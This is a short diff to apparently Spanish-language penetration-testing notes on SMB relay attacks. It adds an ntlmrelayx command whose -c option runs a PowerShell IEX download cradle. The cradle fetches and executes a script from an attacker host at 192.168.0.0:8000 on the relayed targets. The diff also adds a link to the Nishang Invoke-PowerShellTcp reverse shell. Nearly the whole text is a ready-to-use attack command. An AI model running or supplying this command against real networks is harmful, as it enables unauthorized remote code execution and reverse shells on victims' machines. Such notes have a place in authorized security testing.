@@ -45,5 +45,6 @@ ntlmrelayx.py -tf <targets.txt> -smb2support
 
 # Ejecutar comandos mediante un SMB Relay por IPv4
 ```
-ntlmrelayx.py -tf <targets.txt> -smb2support
+ntlmrelayx.py -tf <targets.txt> -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.0.0:8000/PS.ps1')"
 ```
+[Descargar shell de Nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
